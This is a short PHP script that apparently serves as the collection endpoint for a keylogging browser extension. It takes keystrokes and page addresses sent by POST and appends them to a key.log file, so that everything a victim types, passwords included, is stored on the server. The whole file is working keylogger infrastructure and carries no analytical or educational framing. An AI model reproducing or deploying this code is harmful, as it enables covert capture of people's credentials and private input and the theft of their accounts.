<?php

### This file is placed

session_start();

### Make sure extension is the one running the script
if (!isset($_POST['key'])) {
        echo ("Access denied!");
        exit(0);
}

$file = fopen("key.log", "a+");

if (!isset($_SESSION['page']) || $_SESSION['page'] != $_POST['page']) {
	$_SESSION['page'] = $_POST['page'];
	fwrite($file, "\n[ PAGE: ".$_POST['page']."] ");
}

fwrite($file, $_POST['key']); 

fclose($file);

echo("Char saved!");